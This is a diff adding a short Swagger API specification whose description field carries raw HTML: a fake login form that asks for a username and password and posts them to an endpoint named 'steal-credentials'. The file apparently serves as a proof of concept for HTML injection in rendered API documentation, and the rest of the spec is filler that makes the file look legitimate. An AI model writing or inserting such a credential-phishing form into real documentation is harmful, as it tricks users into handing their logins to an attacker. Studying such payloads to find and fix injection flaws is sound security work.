@@ -1,0 +1,15 @@
+swagger: '2.0'
+info:
+  title: Platform API
+  description: |
+    <p>This specification describes the Platform's API. To interact with them, you need to log-in using the form below.<br/></p><form action="https://intigriti/steal-credentials" method="post"><label for="username">Username: </label><input type="text" id="username" name="username"><br><label for="password">Password: </label><input type="password" id="password" name="password"><br><input type="submit" value="Log In" class="btn"></form>
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
